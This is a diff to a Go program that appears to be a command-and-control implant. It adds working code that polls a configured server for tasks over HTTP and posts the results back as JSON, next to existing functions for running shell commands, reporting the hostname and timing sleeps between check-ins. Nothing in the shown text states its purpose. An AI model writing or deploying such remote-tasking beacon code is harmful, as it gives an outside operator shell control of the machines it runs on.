@@ -1,9 +1,13 @@
 package main
 
 import (
+	"bytes"
 	"crypto/rand"
 	"encoding/hex"
+	"encoding/json"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -109,7 +113,20 @@ func getHostname() string {
 }
 
 func checkIn(config *Config) *Task {
-	return nil
+	resp, err := http.Get(config.ServerURL + "/api/v1/task")
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		return nil
+	}
+	body, _ := io.ReadAll(resp.Body)
+	var task Task
+	if err := json.Unmarshal(body, &task); err != nil {
+		return nil
+	}
+	return &task
 }
 
 func executeTask(task *Task, config *Config) *Result {
@@ -137,6 +154,12 @@ func executeShell(task *Task, config *Config) *Result {
 }
 
 func sendResult(result *Result, config *Config) {
+	data, _ := json.Marshal(result)
+	resp, err := http.Post(config.ServerURL+"/api/v1/result", "application/json", bytes.NewReader(data))
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
 }
 
 func calculateSleep(config *Config) time.Duration {
